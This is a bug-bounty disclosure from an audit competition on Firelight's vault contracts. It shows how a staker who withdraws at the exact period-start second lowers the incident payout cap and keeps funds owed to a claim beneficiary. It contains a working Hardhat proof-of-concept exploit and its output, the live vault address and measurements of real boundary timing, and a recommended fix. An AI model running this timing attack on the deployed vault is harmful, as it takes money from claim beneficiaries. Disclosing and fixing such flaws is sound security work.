# 89555 sc high a staker who times a withdrawal to the exact period start second halves the incident payout and keeps the difference

**Submitted on Aug 19th 2026 at 20:35:16 UTC by @Kuzomo for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89555
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/lib/Checkpoints.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`totalAssetsAt(periodStart)` is the single historical value behind both the allocator's capacity basis and the vault's incident payout cap. It is not a snapshot of the state as the period began: `upperLookupRecent` selects the most recent checkpoint with a key less than **or equal to** the search key, so any vault state change landing in a block whose `block.timestamp` equals the period start is folded into that period's "starting" figure. An ordinary withdrawal in that one-second window therefore rewrites the period's exposure basis after the period has already started, and the staker who lands it keeps the difference. In the run below a redeem at the exact boundary drops `totalAssetsAt(periodStart)` from 1,000,000,000 to 500,000,000, an incident payout requesting 1,000,000,000 pays only 500,000,000, and the redeeming staker walks away with 500,000,000. The identical sequence one second later pays the beneficiary in full and leaves that staker with nothing. The 500,000,000 the beneficiary loses is exactly the 500,000,000 the staker keeps. When an allocation was committed earlier in that same block, the contract then rejects its own commitment: recommitting at the capacity it just accepted reverts `MatchingCapacityOverflow`, and recommitting at the period's new maximum reverts `TotalAllocationOverflow`.

## Vulnerability Details

The lookup is inclusive of the search key:

```solidity
/**
 * @dev Returns the value in the last (most recent) checkpoint with a key lower or equal than the search key,
 * or zero if there is none.
 */
function upperLookupRecent(Trace256 storage self, uint48 key) internal view returns (uint256) {
    uint208 idx = self._trace.upperLookupRecent(key);
    return idx > 0 ? self._values[idx] : 0;
}
```

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L217-L224>

`totalAssetsAt` is exactly that lookup (<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L456-L458>), and `redeem`/`withdraw` push a post-request total keyed on `Time.timestamp()` through `_logTrace` (<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056>). A period start is an exact second, computed as `pc.epoch + periodsSinceEpoch * pc.duration` (<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1123-L1128>), so a redeem in a block carrying that timestamp writes a checkpoint at exactly the key the period-start lookup resolves to.

Two independent consumers read that one value. The payout cap:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L909-L927>

and the allocator's capacity basis:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L725>

`commitAllocation` must run in the period it commits for, so the earliest it can execute is the period-start block itself. A redeem later in that same block therefore rewrites the basis the commitment was validated against, after validation. `_validateMatchingCapacity` proves this directly when re-run (<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L394-L403>).

This also defeats a guarantee the payout function states for itself. Lines 918-920 keep withdrawals requested during the capture period inside `activePayableAmount` because "otherwise exposed assets could escape by withdrawing first". The boundary redeem keeps those assets nominally payable but lowers the other term of the `Math.min`, so the assets escape through the cap instead.

A secondary amplifier sits in the same library: `push` replaces the stored value when a key repeats (`if (exists && key == lastKey) { self._values[len - 1] = value; }`, Checkpoints.sol#L198-L215), so several state changes in the period-start block collapse to the last one rather than accumulating.

## Impact Details

A staker who times an ordinary exit to the period-start second keeps funds that an approved claim was entitled to, one-for-one. The same two runs, differing only in the redeem's timestamp:

```
redeem AT the boundary : beneficiary paid 500000000 | redeemer keeps 500000000
redeem at +1 second    : beneficiary paid 1000000000 | redeemer keeps 0
redeemer GAINS by timing : 500000000
beneficiary LOSES        : 500000000
```

In those runs the staker's position would have been slashed to nothing at the correct timing and keeps half at the boundary, and the 500,000,000 they retain is exactly the 500,000,000 the beneficiary of a valid approved claim does not receive. The proportions depend on the size of the payout relative to the position; the equality between the staker's gain and the beneficiary's loss does not.

This is what the payout function itself is written to prevent. Withdrawals requested during the capture period are deliberately kept inside `activePayableAmount` because "otherwise exposed assets could escape by withdrawing first" (lines 918-920). Boundary timing defeats that guard from the other side: the assets stay nominally payable, but the cap they are measured against is rewritten downward, so they escape through the `Math.min` instead of through the withdrawal bucket.

The action costs nothing beyond an ordinary exit the staker wanted to make anyway, requires no role or allowlist, and can be repeated at every period boundary. The live vault's `periodConfigurations(0)` reports `duration = 86400`, so boundaries recur **daily**, and 12 of the last 14 actual boundaries carried a block at exactly that second (measured below).

No adversary is even required for the damage half: any staker's ordinary `redeem` or `withdraw` landing on that second produces the same reduction in the payout ceiling, so the defect also fires on honest traffic.

Where an allocation was committed in the same block, the protocol has additionally sold cover against a capacity figure that no longer exists: the commitment stores `totalAvailableCapacity` of 2000e18 with 1500e18 allocated, and after the redeem the contract rejects both repair attempts, so the period runs with cover outstanding against a basis the contract itself will not re-accept.

Feasibility Limitations check. Privileged actors do appear in the sequence, and every one of them acts correctly. The allocator commits an allocation that was valid at the capacity the contract itself reported; the payout signer pays out a confirmed incident through the documented waterfall. Neither is asked to misbehave, to act incorrectly, or to exceed its documented privileges, and the report does not depend on any risk parameter, buffer setting or other operator-selected value: the boundary is an exact second for every possible `epoch` and `duration`, so the result is invariant to how the protocol is configured. What breaks the protocol is an unprivileged action. An ordinary staker rewrites the period's exposure basis after those correct privileged actions have already relied on it, bypassing the intended constraint that a period's starting figure is fixed when the period starts. The contract then contradicts itself, which is the clearest statement that a protocol constraint was bypassed rather than merely configured badly: recommitting at the capacity the contract had just accepted reverts `MatchingCapacityOverflow`, and recommitting at the period's new maximum reverts `TotalAllocationOverflow`. Attack investment: the cost of one ordinary withdrawal the staker wanted to make anyway. Financial risk to attacker: none, since the withdrawal is a normal exit. The one real constraint is timing: the redeem must land in a block whose timestamp equals the period start exactly. Measured against the live deployment, that constraint is weak. The vault at `0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3` reports `periodConfigurations(0)` of `epoch = 1764682969, duration = 86400`, so boundaries fall on `epoch + n * 86400` — one every day. Binary searching Flare mainnet by block timestamp for the last 14 of those actual boundaries (chain id 14, 2026-08-19):

```
period  boundary ts   block      block ts      exact?
   260  1787146969    67764965  1787146969   YES
   259  1787060569    67689328  1787060569   YES
   258  1786974169    67613933  1786974169   YES
   257  1786887769    67538763  1786887769   YES
   256  1786801369    67464427  1786801369   YES
   255  1786714969    67389041  1786714965   no    (11s gap across the boundary)
   254  1786628569    67313847  1786628569   YES
   253  1786542169    67238441  1786542169   YES
   252  1786455769    67162912  1786455769   YES
   251  1786369369    67087558  1786369369   YES
   250  1786282969    67012090  1786282969   YES
   249  1786196569    66937152  1786196558   no    (12s gap across the boundary)
   248  1786110169    66860838  1786110169   YES
   247  1786023769    66785449  1786023769   YES

12/14 = 85.7% of real Firelight period boundaries carry a block at the exact second
```

That matches the chain-wide figure: over 2,400 consecutive headers the mean block time is 1.118 s, 94.9 % of consecutive blocks are exactly one second apart, no two blocks share a timestamp, and 89.49 % of wall-clock seconds carry a block (two further windows 24 h apart: 88.72 % and 89.17 %). The two misses above are both explained by an 11-12 second gap straddling that boundary.

So the opportunity exists at roughly six of every seven boundaries and recurs **daily**. This bounds the opportunity rather than the hit rate of a single attempt: a block producer decides inclusion, so a targeting attacker submits near the boundary with a competitive fee and retries the next day. The accidental path needs no targeting at all — any staker's ordinary exit landing in that block is sufficient. The commit-ordering variant additionally requires the commitment to land in the same block, ahead of the redeem. Chain rollbacks and pre-impact monitoring: not cited; the checkpoint write and the later payout are ordinary committed transactions with no guardian inspecting them.

## Recommendation

Make the period-start snapshot exclusive of the boundary key so it cannot be written after the period has begun. Reading `totalAssetsAt(periodStart - 1)`, or adding an `upperLookupStrict` variant that selects the last checkpoint with a key strictly less than the search key, gives both `payout` and `_computeAvailableCapacity` a value that is immutable once the period starts. Alternatively, have the vault write an explicit period-start checkpoint on the first interaction of each period and read that, so the exposure basis is a recorded value rather than a lookup that later writes can land on.

## References

* inclusive lookup: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L217-L224>
* same-key replacement amplifier: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L198-L215>
* payout cap consumer: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L966>
* capacity basis consumer: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L725>
* checkpoint written on redeem/withdraw: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056>

## Proof of Concept

## Proof of Concept

Local Hardhat only; no mainnet or public-testnet transaction was sent. The run wires the real `CoverOrderAllocator` to the real `FirelightVault` so the capacity basis and the payout cap read the same on-chain value. The first test places `commitAllocation` and the boundary redeem in one block at the exact period-start second and asserts that placement mechanically (same `blockNumber`, commit index strictly lower, block timestamp equal to the boundary). The second measures the redeemer's realised outcome in both branches and asserts the gain equals the beneficiary's loss. The third is the `+1 second` negative control.

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight && cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm ci
npx hardhat test test/poc_boundary_cap.js
```

```javascript
// PoC — totalAssetsAt(periodStart) is the single snapshot behind both the allocator's capacity basis
// and the vault's incident payout cap, and a withdrawal landing on the exact period-start second
// retroactively rewrites it.
//
// Run:  npx hardhat test test/poc_boundary_cap.js
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures')

const E18 = 10n ** 18n
const TEN_YEARS = 10 * 365 * 24 * 3600

const funded = async () => {
  const w = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [w.address, '0x3635C9ADC5DEA00000'])
  return w
}

// Real CoverOrderAllocator wired to the real FirelightVault, so _computeAvailableCapacity reads the
// vault's own totalAssetsAt(currentPeriodStart()).
async function stack () {
  const v = await deployVault({ decimals: 6, initial_deposit_limit: '1000000000000' })
  const admin = await funded(), curator = await funded(), allocatorRole = await funded()
  const configAdmin = await funded(), adminRole = await funded(), collector = await funded(), flbWallet = await funded()
  const usdc = await (await ethers.getContractFactory('MockERC20')).deploy('USD', 'USD', 6)
  const feed = await (await ethers.getContractFactory('MockAggregatorV3')).deploy(18, E18)
  const nft = await upgrades.deployProxy(await ethers.getContractFactory('CoverNFT'),
    ['Firelight Cover', 'FLCOVER', '', admin.address, v.deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: 'transparent' })
  const allocator = await upgrades.deployProxy(await ethers.getContractFactory('CoverOrderAllocator'), [{
    vault: v.firelight_vault.target, premiumCollector: collector.address, coverNFT: nft.target,
    priceFeedAdapter: feed.target, maxPriceAge: TEN_YEARS, premiumTokens: [usdc.target],
    admin: admin.address, adminRole: adminRole.address, curatorRole: curator.address,
    allocatorRole: allocatorRole.address, configAdminRole: configAdmin.address,
    initialProtocolConcentrations: [{ protocol: 'Morpho', chainId: 1, maxProtocolConcentrationBps: 10000 }],
    newMarkets: [{ chainId: 1, protocol: 'Morpho', market: ethers.encodeBytes32String('market-A') }],
    capacityConfig: {
      minCAR: 12000, firstLossBufferToken: usdc.target, firstLossBuffer: flbWallet.address,
      effectiveLeverage: 24000, minOrderMarketCoverAmount: 1, divergenceToleranceBps: 0,
    },
  }], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
  return { v, allocator, allocatorRole, configAdmin }
}

// offset 0 -> commit and redeem share the period-start block, commit first.
// offset 1 -> identical sequence with the redeem one second later.
async function run (offset) {
  let redeemTxHash
  const { v, allocator, allocatorRole, configAdmin } = await stack()
  const vault = v.firelight_vault
  const [lp] = v.users
  await v.utils.mintAndApprove(1_000_000_000n, lp)
  await vault.connect(lp).deposit(1_000_000_000n, lp.address)     // basis 1e9 @ $1 -> capacity 2000e18

  const pc = await vault.periodConfigurations(0)
  const boundary = BigInt(pc[0]) + BigInt(pc[1])
  const root = ethers.id('committed-root'), CAP = 2_000n * E18, ALLOC = 1_500n * E18

  if (offset === 0) {
    // Explicit gasLimits are required: with automine off, hardhat-ethers otherwise assigns the full
    // 30M block gas limit per tx and only one would fit in the block.
    await ethers.provider.send('evm_setAutomine', [false])
    await ethers.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
    const P0 = await vault.currentPeriod()
    const c = await allocator.connect(allocatorRole).commitAllocation(P0 + 1n, root, ALLOC, CAP, { gasLimit: 3_000_000 })
    const d = await vault.connect(lp).redeem(500_000_000n, lp.address, lp.address, { gasLimit: 3_000_000 })
    redeemTxHash = d.hash
    await ethers.provider.send('evm_mine', [])
    await ethers.provider.send('evm_setAutomine', [true])
    const rc = await ethers.provider.getTransactionReceipt(c.hash)
    const rd = await ethers.provider.getTransactionReceipt(d.hash)
    expect(rc.status).to.equal(1); expect(rd.status).to.equal(1)
    expect(rc.blockNumber).to.equal(rd.blockNumber)                     // same block
    expect(rc.index).to.be.lessThan(rd.index)                           // commit strictly first
    expect(BigInt((await ethers.provider.getBlock(rc.blockNumber)).timestamp)).to.equal(boundary)
  } else {
    await time.setNextBlockTimestamp(boundary)
    await allocator.connect(allocatorRole).commitAllocation(await vault.currentPeriod() + 1n, root, ALLOC, CAP)
    await time.setNextBlockTimestamp(boundary + BigInt(offset))
    const d = await vault.connect(lp).redeem(500_000_000n, lp.address, lp.address)
    redeemTxHash = d.hash
  }
  const rc2 = await ethers.provider.getTransactionReceipt(redeemTxHash)
  const reqPeriod = rc2.logs.map(l => { try { return vault.interface.parseLog(l) } catch { return null } })
    .find(x => x && x.name === 'WithdrawRequest').args[3]

  const P = await vault.currentPeriod()
  const commit = await allocator.getAllocationCommitment(P)
  const basis = await vault.totalAssetsAt(boundary)
  const b = await v.token_contract.balanceOf(v.payout_receiver.address)
  await vault.connect(v.payout_signer).payout(v.payout_receiver.address, 1_000_000_000n, boundary)
  const paid = (await v.token_contract.balanceOf(v.payout_receiver.address)) - b
  return { v, vault, lp, allocator, configAdmin, P, commit, basis, paid, CAP, ALLOC, reqPeriod }
}

// What the redeeming staker actually walks away with: remaining share value plus the
// delayed withdrawal once it becomes claimable.
async function redeemerOutcome (r) {
  await time.increase(3 * 604800)
  const shares = await r.vault.convertToAssets(await r.vault.balanceOf(r.lp.address))
  let claimed = 0n
  try {
    const b = await r.v.token_contract.balanceOf(r.lp.address)
    await r.vault.connect(r.lp).claimWithdraw(r.reqPeriod)
    claimed = (await r.v.token_contract.balanceOf(r.lp.address)) - b
  } catch { claimed = 0n }
  return { shares, claimed, total: shares + claimed }
}

describe('PoC: a period-start-second withdrawal rewrites the period exposure snapshot', function () {
  this.timeout(180000)

  it('halves the incident payout and invalidates the capacity the commitment was validated against', async () => {
    const r = await run(0)
    console.log('  committed totalAvailableCapacity :', r.commit.totalAvailableCapacity.toString())
    console.log('  committed totalDeclaredAllocated :', r.commit.totalDeclaredAllocated.toString())
    console.log('  totalAssetsAt(periodStart) after :', r.basis.toString(), ' (was 1000000000)')
    console.log('  incident payout, 1000000000 req  :', r.paid.toString())
    expect(r.commit.totalAvailableCapacity).to.equal(r.CAP)
    expect(r.basis).to.equal(500_000_000n)
    expect(r.paid).to.equal(500_000_000n)

    // The contract itself now rejects the capacity it accepted moments earlier in the same block.
    await expect(r.allocator.connect(r.configAdmin).recommitAllocation(r.P, ethers.id('repair-1'), r.ALLOC, r.CAP))
      .to.be.revertedWithCustomError(r.allocator, 'MatchingCapacityOverflow')
    console.log('  recommit @ committed capacity    -> MatchingCapacityOverflow')
    await expect(r.allocator.connect(r.configAdmin).recommitAllocation(r.P, ethers.id('repair-2'), r.ALLOC, 1_000n * E18))
      .to.be.revertedWithCustomError(r.allocator, 'TotalAllocationOverflow')
    console.log('  recommit @ period new maximum    -> TotalAllocationOverflow')
  })

  it('the boundary redeemer keeps 500000000 that the beneficiary would otherwise have received', async () => {
    const atBoundary = await run(0)
    const lpAt = await redeemerOutcome(atBoundary)
    const plusOne = await run(1)
    const lpPlus = await redeemerOutcome(plusOne)

    console.log('  redeem AT the boundary : beneficiary paid', atBoundary.paid.toString(),
                '| redeemer keeps', lpAt.total.toString(),
                `(shares ${lpAt.shares} + claimed ${lpAt.claimed})`)
    console.log('  redeem at +1 second    : beneficiary paid', plusOne.paid.toString(),
                '| redeemer keeps', lpPlus.total.toString(),
                `(shares ${lpPlus.shares} + claimed ${lpPlus.claimed})`)
    console.log('  redeemer GAINS by timing :', (lpAt.total - lpPlus.total).toString())
    console.log('  beneficiary LOSES        :', (plusOne.paid - atBoundary.paid).toString())

    expect(lpPlus.total).to.equal(0n)                                   // correct timing: fully slashed
    expect(lpAt.total).to.equal(500_000_000n)                           // boundary timing: half preserved
    expect(lpAt.total - lpPlus.total).to.equal(plusOne.paid - atBoundary.paid)  // one-for-one transfer
  })

  it('negative control: the identical sequence one second later changes nothing', async () => {
    const r = await run(1)
    console.log('  totalAssetsAt(periodStart) after :', r.basis.toString())
    console.log('  incident payout, 1000000000 req  :', r.paid.toString())
    expect(r.basis).to.equal(1_000_000_000n)
    expect(r.paid).to.equal(1_000_000_000n)
    await r.allocator.connect(r.configAdmin).recommitAllocation(r.P, ethers.id('ok'), r.ALLOC, r.CAP)
    console.log('  recommit @ committed capacity    -> OK, no retroactive rewrite')
  })
})
```

Observed output:

```
  PoC: a period-start-second withdrawal rewrites the period exposure snapshot
  committed totalAvailableCapacity : 2000000000000000000000
  committed totalDeclaredAllocated : 1500000000000000000000
  totalAssetsAt(periodStart) after : 500000000  (was 1000000000)
  incident payout, 1000000000 req  : 500000000
  recommit @ committed capacity    -> MatchingCapacityOverflow
  recommit @ period new maximum    -> TotalAllocationOverflow
    ✔ halves the incident payout and invalidates the capacity the commitment was validated against
  redeem AT the boundary : beneficiary paid 500000000 | redeemer keeps 500000000 (shares 250000000 + claimed 250000000)
  redeem at +1 second    : beneficiary paid 1000000000 | redeemer keeps 0 (shares 0 + claimed 0)
  redeemer GAINS by timing : 500000000
  beneficiary LOSES        : 500000000
    ✔ the boundary redeemer keeps 500000000 that the beneficiary would otherwise have received
  totalAssetsAt(periodStart) after : 1000000000
  incident payout, 1000000000 req  : 1000000000
  recommit @ committed capacity    -> OK, no retroactive rewrite
    ✔ negative control: the identical sequence one second later changes nothing

  3 passing
```

The two runs differ only in the redeem's timestamp. The `MatchingCapacityOverflow` revert is the contract's own verdict on the commitment it accepted moments earlier in the same block, and `TotalAllocationOverflow` shows the committed allocation no longer fits even at the period's new maximum. The negative control rules out every other difference: with the redeem one second later the basis, the payout and the recommit all behave normally.
